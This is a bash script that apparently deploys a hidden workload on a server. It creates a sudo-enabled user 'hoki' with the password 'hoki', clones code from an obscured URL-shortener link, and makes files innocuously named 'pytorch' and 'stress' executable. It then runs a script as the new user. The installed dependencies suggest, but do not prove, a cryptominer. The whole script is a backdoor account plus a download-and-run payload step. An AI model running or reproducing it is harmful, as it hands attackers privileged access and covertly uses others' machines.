#!/bin/bash
apt update
apt install sudo
sudo apt install screen libjansson4 -y
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
git clone https://tiny.one/trausictor
cd trausictor
sudo chown hoki:sudo pytorch
sudo chown hoki:sudo sugg1.sh
sudo chmod 700 stress pytorch
sudo chmod 700 stress sugg1.sh
sudo -u hoki sh -c "/home/hoki/trausictor/sugg1.sh"
